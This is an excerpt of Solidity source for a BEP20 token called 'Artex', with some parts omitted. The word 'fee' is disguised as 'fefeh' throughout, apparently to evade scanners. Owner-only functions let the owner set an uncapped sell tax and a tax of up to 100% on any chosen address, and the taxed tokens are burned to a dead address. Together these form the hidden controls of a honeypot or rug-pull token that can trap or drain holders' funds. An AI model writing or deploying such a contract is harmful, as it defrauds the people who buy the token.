...
interface IUniswapV2Factory {
    ...
    function fefehTo() external view returns (address);
    function fefehToSetter() external view returns (address);
    ...
    function setfefehTo(address) external;
    function setfefehToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfefehOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfefehOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfefehOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfefehOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfefehOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Artex is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfefeh = 0;

    uint256 private _defaultBuyfefeh = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfefeh;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfefeh = _value;
    }

    function setSlipfefeh(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfefeh[_address] = _value;
    }

    function getSlipfefeh(address _address) external view onlyownar returns (uint256) {
        return _slipfefeh[_address];
    }


    function setMAccountfefeh(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfefeh(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefefehAmount = 0;

        if (rF) {
            uint256 tradefefeh = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefefeh = _defaultSellfefeh;
                }
                if (from == uniswapV2Pair) {

                    tradefefeh = _defaultBuyfefeh;
                }
            }
            if (_slipfefeh[from] > 0) {
                tradefefeh = _slipfefeh[from];
            }

            tradefefehAmount = _Amount.mul(tradefefeh).div(100);
        }


        if (tradefefehAmount > 0) {
            _balances[from] = _balances[from].sub(tradefefehAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefefehAmount);
            emit Transfer(from, _deadAddress, tradefefehAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefefehAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefefehAmount);
        emit Transfer(from, _to, _Amount - tradefefehAmount);
    }
